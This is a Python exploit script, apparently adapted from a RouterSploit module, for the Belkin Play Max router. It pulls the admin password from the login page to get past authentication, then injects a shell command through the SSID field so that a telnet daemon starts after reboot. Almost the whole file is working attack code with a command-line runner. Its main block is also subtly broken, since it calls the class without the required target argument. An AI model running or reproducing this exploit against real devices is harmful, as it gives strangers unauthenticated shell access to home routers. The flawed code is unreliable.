target = ""
# rsf exploit module
# description: Exploits Belkin SSID injection vulnerability allowing remote code execution.

import re
import requests

class Exploit:
    __info__ = {
        "name": "Belkin Play Max Persistent RCE",
        "description": "Module exploits Belkin SSID injection vulnerability allowing remote code execution.",
        "authors": (
            "BigNerd95 (Lorenzo Santina) https://github.com/bignerd95",  # vulnerability discovery and routersploit module
        ),
        "references": (
            "https://bignerd95.blogspot.it/2017/02/belkin-play-max-persistent-remote.html",
            "https://gist.github.com/BigNerd95/c18658b472ac0ccf4dbbc73fe988b683",
        ),
        "devices": (
            "Belkin Play Max (F7D4401)",
        ),
    }

    def __init__(self, target, port=80, cmd="telnetd"):
        self.target = target
        self.port = port
        self.cmd = cmd

    def auth_bypass(self):
        response = requests.get(f"http://{self.target}:{self.port}/login.stm")
        if response is None:
            return False

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)

        if len(val):
            payload = f"pws={val[0]}&arc_action=login&action=Submit"

            login = requests.post(f"http://{self.target}:{self.port}/login.cgi", data=payload)
            if login is None:
                return False

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print("Exploit success, you are now logged in!")
                return True

        print("Exploit failed. Device seems to be not vulnerable.")
        return False

    def inject_command(self):
        response = requests.get(f"http://{self.target}:{self.port}/wireless_id.stm")
        if response is None:
            print("Exploit failed. No response from target!")
            return

        srcSSID = re.search(r"document\.tF\['ssid'\]\.value=\"(.*)\";", response.text)
        if srcSSID:
            SSID = srcSSID.group(1)
        else:
            print("Exploit failed. Are you logged in?")
            return

        if len(SSID) + 2 + len(self.cmd) > 32:
            newlen = 32 - len(self.cmd) - 2
            SSID = SSID[0:newlen]
            print(f"SSID too long, it will be truncated to: {SSID}")

        newSSID = SSID + "%3B" + self.cmd + "%3B"

        payload = f"page=radio.asp&location_page=wireless_id.stm&wl_bssid=&wl_unit=0&wl_action=1&wl_ssid={newSSID}&arc_action=Apply+Changes&wchan=1&ssid={newSSID}"
        response = requests.post(f"http://{self.target}:{self.port}/apply.cgi", data=payload)

        if response is None:
            print("Exploit failed. No response from target!")
            return

        err = re.search(r'countdown\(55\);', response.text)
        if err:
            print("Exploit success, wait until router reboot.")
        else:
            print("Exploit failed. Device seems to be not vulnerable.")

    def run(self):
        if self.auth_bypass():
            self.inject_command()

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/login.stm")
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
